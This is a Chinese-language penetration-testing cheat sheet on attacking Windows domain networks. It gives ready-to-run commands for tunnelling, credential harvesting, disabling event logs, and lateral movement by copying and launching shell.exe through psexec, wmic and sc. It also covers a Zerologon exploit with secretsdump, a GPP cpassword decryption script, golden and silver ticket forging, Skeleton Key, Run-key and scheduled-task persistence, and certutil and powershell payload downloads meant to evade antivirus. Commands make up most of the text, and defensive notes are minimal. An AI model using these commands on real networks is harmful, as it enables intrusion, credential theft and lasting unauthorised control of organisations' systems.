# 内网渗透

## 隧道、代理、端口转发

### 代理与端口转发

#### proxychains

只支持`TCP`，不支持`UDP`和`ICMP`等

与`nmap`使用的时候，会出现问题。需要在配置文件中，注释掉`proxy_dns`

windows端：https://github.com/shunf4/proxychains-windows.git

#### proxifier

适用windows

#### Venom

https://github.com/Dliv3/Venom

#### IOX

下载链接：https://github.com/EddieIvan01/iox/blob/master/docs/README_CN.md

### 隧道搭建

#### dnscat2

#### Neo-reGeorg	

https://github.com/L-codes/Neo-reGeorg

#### SSH

**本地转发**

在本地监听一个端口，并转发到远程主机上

```
# 监听在本地9906端口，并把9906的数据转发到目标主机上3389端口
ssh -g -f -N -L 9906:target_ip:3306 root@target_ip

```

**远程转发**

在远程主机上监听一个端口，并转发到本地

```
ssh -N -f -R 9906
```

http://www.zsythink.net/archives/2450

```
# 配置文件 /etc/ssh/sshd_config

AllowAgentForwarding yes
AllowTcpForwarding yes
GatewayPorts yes
```

端口转发

```
ssh -CNfT -R 4444:
```



## 判断协议出网

dns

```
nslookup 8.8.8.8  # windows
dig 8.8.8.8   # linux
```

http

```
curl www.baidu.com   # windows
wget www.baidu.com
```

icmp

```
ping www.baidu.com
```

tcp

```
telnet www.baidu.com
```

## 关闭系统日志记录

提权后关闭系统日志记录

```
工具：https://github.com/hlldz/Invoke-Phant0m.git
```

## 信息收集

- 查看当前用户及权限

  ```
  whoami /user
  whoami /priv
  ```

* 查看在线用户

  ```
  query user | quser
  # 避开管理员
  ```

* 查看当前用户属组

  ```
  net user [username]
  ```

* 查看主机名、工作组/域、操作系统信息

  ```
  systeminfo
  
  net config workstation
  
  wmic OS get Caption, CSDVersion, OSArchitecture, Version
  ```

* 补丁信息

  ```
  WMIC.exe qfe get HotFixID   
  
  >>>> 查询可提权网站：http://bugs.hacking8.com/tiquan/
  >>>> 使用工具查询：https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git
  ```

* 杀软信息

  ```
  wmic /namespace:\\root\securitycenter2 path antivirusproduct GET displayName
  ```

* 搜索域控

  ```
  WMIC.exe ntdomain
  net time /domain
  ```

* 收集敏感信息：

  ```
  # 敏感文件收集
  dir /a /s /b d:\"*.txt|*.xml|*.mdb|*.sql|*.mdf|*.eml|*.pst|*conf*|*bak*|*pwd*|*pass*|*login*|*user*"
  	
  ```

  ```
  # 账号密码收集
  findstr /si pass *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
  
  findstr /si userpwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
  
  findstr /si password *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
  
  findstr /si login *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
  
  findstr /si user *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
  
  findstr /si pwd *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
  
  findstr /si username *.inc *.config *.ini *.txt *.asp *.aspx *.php *.jsp *.xml *.cgi *.bak
  ```

* 查看目标主机共享

  ```
  net view \\target-ip   # 是否用空密码访问权限，如果知道用户名和密码
  copy shell.exe \\ip\c$\windows\temp\shell.exe
  ```

* 执行后门

  ```
  psexec \\ip -u userName -p userPass cmd.exe c:\windows\temp\shell.exe
  
  csript.exe wmiexec.vbs /cmd domainName userName userPass "ipconfig"
  
  wmic /node:ip /user:userName /password:userPass process call create "C:\Windows\temp\shell.exe"
  ```

## 收集用户口令

##### windows

mimikatz、LaZagne

Xshell凭证

远程连接凭证：https://github.com/3gstudent/List-RDP-Connections-History.git

##### linux

```
find ./ -type f -regex '.*\.txt|.*\.xml|.*\.php|.*\.jsp|.*\.conf|.*\.bak|.*\.js|.*\.inc|.*\.htpasswd|.*\.inf|.*\.ini|.*\.log|.*\.new' | xargs egrep "user|uname|pass|pwd|admin"

cat /root/.bash_history|grep -Ei -C 2 'ssh|mysql|ftp|scp|su|root|passwd'
```

## 存活主机

##### Windows

NetBIOS   UDP   137端口

ICMP

smb_version

telnet(需自己上传)

##### Linux

## 提权

##### Mysql提权

###### UDF(user defined function)提权

udf.dll 存放位置

> mysql > 5.1，udf.dll存放在 `%mysql%\lib\plugin`
>
> mysql <5.1 ，udf.dll 存放在 `C:\windows` 或者 `C:\windows\system32`

secure_file_priv 文件

> ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
>
> 当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
>
> 当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制

###### Mof提权



## 路由

```
meterpreter > run get_local_subnets
meterpreter > run autoroute -s 192.168.93.0/255.255.255.0
```



## 域环境

```
net user   本机用户
net user /domain   域用户
net user username /domain   获取指定用户信息
net user username newpassword  /domain   修改域用户密码

net group /domain  查看域工作组
net group "domain admins" /domain   查看域管理员列表
net group "enterprise admins" /domain   企业管理员列表
net group "domain controllers" /domain   查看域控制器

net localgroup administrators /domain   登录本机的域用户

net time /domain   判断域控

net view  查看域内机器列表
net start  查看当前运行的服务
net session  查看当前的会话
```

定位域控

```
1、DNS定位域控
nslookup
>>set type=all
>>test.com

2、nltest /dclist:test.com

3、net time /domain

4、端口：389(ldap)、53(dns)
```

主机存活探测

```
和上面一样
```

### 获取域控

#### ms14-068

把普通域用户提升到域控权限，补丁：KB3011780

方式一、

https://github.com/gentilkiwi/kekeo

```
kekeo.exe "exploit::ms14068 /domain:test.com  /user:username /password:password /ptt" "exit"
```

方式二、

mimikatz，这时候并不需要管理员权限。

ms14-068：https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068

```
whoami /user   #获取sid
ms14-068.exe -u [域用户]@[所在域] -s [域用户SID] -p [域用户密码] -d [域控地址]     #制作凭证
kerberos::purge    #清除原有凭证
mimikatz.exe "kerberos::ptc c:[上面的凭证]" exit   //导入新的凭证
```

可以在`msf`中的`meterpreter`中直接使用

![image-20210110155155661](C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210110155155661.png) 

使用psexec远程连接即可

![image-20210110172341623](C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210110172341623.png)

就可以直接添加域管理员

```
net user username password /add /domain
net group "Domain admins" username /add /domain
```

#### GPP

 **存在的意义：**在比较大一点的环境中，我们会经常遇到这样的情况，由于电脑的批次不一样，或IT人员流动的问题，造成电脑的本地管理员密码不一致，当我们需要登录到本地管理员的时候，往往会不知道本地管理员密码，虽然我们可以通过进PE的办法破解密码，但如果电脑比较多，那么这将是一个讨厌的工作。如果是域环境，我们可以组策略的方式批量修改计算机的本地管理员密码。

**利用：**实质上就是一种信息收集的方式，可能存在密码重用

直接访问`\\king.com\SYSVOL\king.com\Policies\{0FD0DF94-3629-4ECA-B858-6F0C60B3A821}\User\Preferences\Groups`

使用脚本解密：

```powershell
# define helper function that decodes and decrypts password
function Get-DecryptedCpassword {
    [CmdletBinding()]
    Param (
        [string] $Cpassword
    )

    try {
        #Append appropriate padding based on string length
        $Mod = ($Cpassword.length % 4)

        switch ($Mod) {
            '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
            '2' {$Cpassword += ('=' * (4 - $Mod))}
            '3' {$Cpassword += ('=' * (4 - $Mod))}
        }

        $Base64Decoded = [Convert]::FromBase64String($Cpassword)
        
        # Make sure System.Core is loaded
        [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null

        #Create a new AES .NET Crypto Object
        $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                             0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)

        #Set IV to all nulls to prevent dynamic generation of IV value
        $AesIV = New-Object Byte[]($AesObject.IV.Length)
        $AesObject.IV = $AesIV
        $AesObject.Key = $AesKey
        $DecryptorObject = $AesObject.CreateDecryptor()
        [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)

        return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
    }

    catch { Write-Error $Error[0] }
}
Get-DecryptedCpassword "6s0v9qCdP8OcbP/xlB1XbNUdTDeC5NnDT196ZKinPsE"  # 修改成相应的密码
```

```
powershell -executionpolicy bypass -file Get-GPPPassword.ps1
```

**修复建议**

使用PsPasswd批量修改域内主机本地管理员密码

#### CVE-2020-1472 域内提权

直接指向域控，so cool！

**工具**

重置域控用户名为空：https://github.com/dirkjanm/CVE-2020-1472

执行各种命令工具(sudo pip3 install .)：https://github.com/SecureAuthCorp/impacket 

恢复域控密码：https://github.com/risksense/zerologon

**影响范围**

> Windows Server 2008 R2 for x64-based Systems Service Pack 1
> Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
> Windows Server 2012
> Windows Server 2012 (Server Core installation)
> Windows Server 2012 R2
> Windows Server 2012 R2 (Server Core installation)
> Windows Server 2016
> Windows Server 2016 (Server Core installation)
> Windows Server 2019
> Windows Server 2019 (Server Core installation)
> Windows Server, version 1903 (Server Core installation)
> Windows Server, version 1909 (Server Core installation)
> Windows Server, version 2004 (Server Core installation)

将域控密码设置为空

```
python3 cve-2020-1472-exploit.py <域控机器名> <域控IP>

python3 cve-2020-1472-exploit.py WIN-03OO218S5B8 192.168.0.4
```

![image-20210131113629119](C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113629119.png)

通过 `Dcsync` 查看密码hash

```
secretsdump.py <域>/<域控机器名>\$@<域控IP> -just-dc -no-pass

secretsdump.py king.com/WIN-03OO218S5B8\$@192.168.0.4 -just-dc -no-pass
```

![image-20210131113844158](C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113844158.png)

通过`wmiexec.py`获取shell

```
wmiexec.py king.com/administrator@<域控IP> -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 king.com/administrator@192.168.0.4

或者
wmiexec.py king.com/administrator@<域控IP> -hashes aad3b435b51404eeaad3b435b51404ee:0d546438b1f4c396753b4fc8c8565d5b king.com/administrator@192.168.0.4
```

![image-20210131113948798](C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131113948798.png)

**恢复密码**

工具：https://github.com/risksense/zerologon

在上面执行的cmd下执行如下命令

```
# SHELL 
reg save HKLM\SYSTEM system.save
reg save HKLM\SAM sam.save
reg save HKLM\SECURITY security.save
get system.save
get sam.saveget security.save
del /f system.save
del /f sam.save
del /f security.save
exit
```

然后利用 `secretsdump` 解析保存在本地的NT hash

![image-20210131120225956](C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120225956.png)

记录下上面获取的数据，接下来使用上面提到的工具恢复hash

```
python3 reinstall_original_pw.py DC_NETBIOS_NAME DC_IP_ADDR <ORI_HASH>
```

![image-20210131120402995](C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120402995.png)

测试用空密码访问，已经失效了

![image-20210131120434157](C:/Users/Rainbow/AppData/Roaming/Typora/typora-user-images/image-20210131120434157.png)

### 横向移动

#### SPN

 cobalt strike

```
shell setspn -T test.com -Q */*   探测域内存活的相关服务
```

导出票据

```
mimikatz.exe "kerberos::list /export"
```

由于加密类型是RC4_HMAC_MD5，Kerberos协议第四步TGS-REP将会返回用服务帐户的NTLM密码哈希加密的票据。
使用字典进行暴力破解：（2.txt为字典）

https://github.com/nidem/kerberoast

```
python tgsrepcrack.py 2.txt "1-40a10000-linghuchong@MSSQLSvc~College-DS1~1433-COLLEGE.COM.kirbi"
```

#### PTH

产生哈希传递原因：https://www.freebuf.com/articles/terminal/80186.html.

微软于2014年5月打了KB2871997补丁用来防范哈希传递，但是Administrator账号(SID为500)是例外的，使用该账户的NTLM Hash依然可以进行哈希传递

#### WMI(回显)

```
exploit/windows/local/wmi
```

#### wmic

```
wmic /node:target_ip /user:username /password:password process call create c:\shell.bat

wmic /node:target_ip /user:username /password:password process call create "cmd.exe /c net user && ipconfig"

wmic /node:target_ip /user:username /password:password process call create "cmd.exe /c shell.exe"
```

#### impackets

https://github.com/SecureAuthCorp/impacket.git

```
python wmiexec.py -hash 000000000000000000000000000000:[ntlm hash] test/administrator@target_ip "whoami"
```

#### psexec

需要远程系统开启`ADMIN$`

在启动psexec建立连接，远程系统上会安装相应 的服务，因此会留下痕迹

```
psexec \\target_ip -u amdinistrator -p password cmd   返回终端

psexec \\target_ip -u administrator -p password -s cmd /c "query user"
```

#### IPC利用

135、445口开放

```
net user \\ip\ipc$ password /user:username

上传木马：
copy shell.exe \\ip\c$\windows\temp\shell.exe

命令执行
psexec \\ip -u username -p password whoami

cscript wmicexec.vbs /cmd domain_name username password whoami

# 服务 
wmic /node:ip /user:username /password:password process call create "c:\windows\temp\shell.exe"
```

#### 计划任务

schtasks

```

```

at

```

```

#### 启动服务

```
# 创建一个服务
sc \\target_ip create WindowsUpdates binPath= "cmd.exe /c start net user"
# 执行和删除
sc \\target_ip start WindowsUpdates
sc \\target_ip delete WindowsUpdates

# 指定administrator账户创建一个 adminsec 的服务
sc \\target_ip create adminsec binPath= "c:\shell.exe" obj="adminsec\administrator" password= adminsec

sc \\target_ip start adminsec
```

## 维权

### 注册表启动项

```
# 查看当前的启动项
REG query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# 添加一个启动项
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v [启动名字] /d "C:\Windows\Temp\shell.exe" /f

# 删除启动项
REG delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v [启动名字] /f
```

### Windows计划任务

利用前提

1. 必须通过其他手段拿到本地或者域管理账号密码
2. 若在横向渗透过程中，要保证当前机器能netuse远程到目标机器上
3. 目标机器开启了taskscheduler服务

```
#远程
schtasks /create /s target_ip /u "administrator" /p "password" /RL HIGHEST /f /tn "windowsUpdate" /windows/tmp/bit.txt /sc DAYLY /mo 1 /ST 20:15  ??

# 本地
schtasks /create /tn "360" /tr C:\Windows\Temp\360.exe /sc DAILY /st 10:00

# 查找
schtasks /query /s target_ip /U "administrator" /P "password" | findstr "windowsUpdates"

# 删除
schtasks /delete /F /tn WindowsUpdates /s target_ip /U "administrator" /P "password" 
```

### 多地登陆管理员账号

查看注册表

```
\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\fSingleSessionPerUser
```

1是不允许多地远程，

0,是允许，03以上的系统基本上默认都是为1不允许所以这里就需要我们更改这个

### SSP(Security Support Provider)

**原理**

https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E7%BB%B4%E6%9D%83.html

**利用**

```
将mimikatz下的mimilib.dll 拷贝到 C:\windows\system32的目录下

添加Security Packages
```

![image-20210110181328115](C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210110181328115.png)

重启成功，如果有用户成功登录到当前系统中,会在 c:\windows\system32 目录下生成一个用于记录登账账号密码的 kiwissp.log 文件

### 黄金票据

Golden Ticket是通过伪造的 TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。

**条件**

```
1、域名称
2、域的SID值
3、域的KRBTGT账户密码HASH
4、伪造用户名，可以是任意的
```

MSF 中使用

```
# 在msf中先steal_token一个域管理员的进程，然后才可以执行下面的命令。一开始使用`impersonate_token`获取的域管理员身份不起作用。

meterpreter > steal_token 1964
Stolen token with username: KING\administrator
meterpreter > dcsync
dcsync       dcsync_ntlm  
meterpreter > dcsync_ntlm krbtgt
[+] Account   : krbtgt
[+] NTLM Hash : 16a358115102a4351ee2240d7f983b23
[+] LM Hash   : 8968fb93cc3e6143a62930984b756f62
[+] SID       : S-1-5-21-1100079753-1400930603-3000301551-502
[+] RID       : 502

# 生成黄金票据，会存放在本地的攻击机系统中

golden_ticket_create -u [任意用户名] -d [所在域] -s [SID去除最后三个] -k [krbtgt的ntlm哈希] -t [保存文件的路径和名字]

meterpreter > golden_ticket_create -u administrator -d king.com -s S-1-5-21-1100079753-1400930603-3000301551 -k 16a358115102a4351ee2240d7f983b23 -t golden.kiribi

# 删除目标机器其他票据
meterpreter > kerberos_ticket_list
meterpreter > kerberos_ticket_purge

# 注入票据
meterpreter > kerberos_ticket_use golden.kiribi    # 直接使用
```

### 白银票据

主要是制作`ST`票据，不会`KDC`交流，直接发送到服务确认。每次制造的票据只能用于访问一个服务。

域管理员上收集信息：

```
# 获取域控sid
whoami /user

# 获取 ntlm 哈希、和主机名
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit">log.txt
```

在域用户上执行，会自动将票据注入。

```
mimikatz.exe "kerberos::golden /domain:king.com /sid:S-1-5-21-1100079753-1400930603-3000301551 /target:WIN-8VSIF64RC10.king.com /service:cifs /rc4:<1bd736c7b3fc68abd61863a15704a661 /user:secquan /ptt"

参数如下：
domain:  域
sid：    域管理员的sid
target： 域控主机名+域
service：要伪造服务票据
rc4：    是 administrator$ 的ntlm哈希，不是 administrator 的哈希，也就是server的哈希
user：   随便指定一个用户
```

只要记录下域管理员的 主机名、服务的哈希、域管理员的sid，下次按需生成服务白银票据。

### 检测域内密码修改

工具：https://github.com/Jumbo-WJB/Misc-Windows-Hacking

只需要文件夹中的`HookPasswordChange.dll`和`Invoke-ReflectivePEInjection.ps1`

```
# 导入包
powershell.exe -ExecutionPolicy Bypass -File Invoke-ReflectivePEInjection.ps1

# 然后修改密码，密码就会被保存在 C:\windows\temp\password.txt 
```

### Skeleton Key

Skeleton Key被安装在64位的域控服务器上,支持Windows Server2003到Windows Server2012 R2,能够让所有域用户使用同一个万能密码（默认密码为"mimikatz"）进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限。

由于 Skeleton Key 是被注入到 lsass.exe 进程的，所以它只存在于内存中，如果域控制器重启，注入的 Skeleton Key 将会失效。

**利用**

```
# 在域控主机上运行 mimikatz

privilege::debug

misc::skeleton

# 在域主机上
net use \\[域控主机名].king.com\c$ mimikatz /user:administrator@king.com

这时候就能查看域控主机
dir \\WIN-8VSIF64RC10.king.com\c$
```

### 域内委派攻击

委派功能只有`服务账号`和`主机账号`才有委派功能，普通域内用户或域控是没有的。

#### 非约束委派攻击

**所需工具**：https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

**原理**：`用户`需要访问`主机1`上的`HTTP服务`，而`HTTP服务`需要请求其他主机的`SQLServer数据库`，但是`主机1`并不知道用户是否有权限访问`SQLServer`，这时`HTTP服务`会利用`用户的TGT`的身份去访问`KDC`，如果`用户`有权限访问`SQLServer服务`才能访问成功。这就是非约束委派的过程。实际上就是将用户自己的TGT委派了一个服务账号，该服务访问任何服务都会带上用户的TGT，因此会再服务机器上留下用户的TGT。

在域控上执行

```
# 导入工具
Set-ExecutionPolicy Bypass -Scope Process -Force
Import-Module .\PowerView.ps1

# 查看非约束委派的用户
Get-NetUser -Unconstrained -Domain king.com

# 查看非约束委派的计算机
Get-NetComputer -Unconstrained -Domain king.com

把已经控制的主机用户设置为非约束委派，并且服务被其他主机访问的情况下才可继续利用
```

在域内主机上用本地管理员登录，执行一下命令

```
# 使用mimikatz导出主机中的所有凭证，找到如下的administrator的TGT凭证
privilege::debug    
sekurlsa::tickets /export
```

![image-20210116105039417](C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210116105039417.png)

将凭证添注入

```
kerberos::ptt xxx.kirbi
```

![image-20210116105528377](C:\Users\Rainbow\AppData\Roaming\Typora\typora-user-images\image-20210116105528377.png)

#### 约束委派攻击

非约束性委派（Unconstrained Delegation），服务账号可以获取某用户的TGT，**从而服务账号可使用该TGT**，模拟用户访问任意服务



## 文件传输

### powershell

```
# 文件上传
powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')

# 文件下载
powershell -exec bypass -c (new-object System.Net.WebClient).DownloadFile('http://192.168.111.1:8080/test/putty.exe','C:\Users\linghuchong\Desktop\Tools\putty1.exe')
putty1.exe
```

### bitsadmin

```
bitsadmin /transfer n http://domain/file c:\windows\temp\shell.exe
```

### certutil

```
certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe
certutil.exe -urlcache -split -f http://192.168.111.1:8080/test/putty.exe delete  #删除缓存
putty.exe
```

可以实现绕过杀软

```
# 编码要上传的exe到txt格式
CertUtil -encode frpc.exe frpc.txt
# 下载txt文件
certutil.exe -urlcache -split -f frpc.txt的地址
# 将txt文件编码成exe文件
CertUtil -decode frpc.txt frpc.exe
```

### nc

```
nc -lvvp 8888 > fileName
nc 1.1.1.1 8888 < fileName
```

## 安全审计

### Lynis

[Lynis](https://github.com/CISOfy/lynis)是一款Unix系统的安全审计以及加固工具，能够进行深层次的安全扫描，其目的是检测潜在的时间并对未来的系统加固提供建议。这款软件会扫描一般系统信息，脆弱软件包以及潜在的错误配置。

### golismero

GoLismero是一款开源的安全测试框架。目前，它的测试目标主要为网站。该框架采用插件模式，实现用户所需要的功能。GoLismero默认自带了导入、侦测、扫描、攻击、报告、UI六大类插件。通过这些插件，用户可以对目标网站进行DNS检测、服务识别、GEOIP扫描、Robots文件扫描、目录暴力枚举等几十项功能。通过插件方式，GoLismero还可以调用其他工具，如Exploit-DB、PunkSPIDER、Shodan、SpiderFoot、theHarvester。但已经许久不更新了。

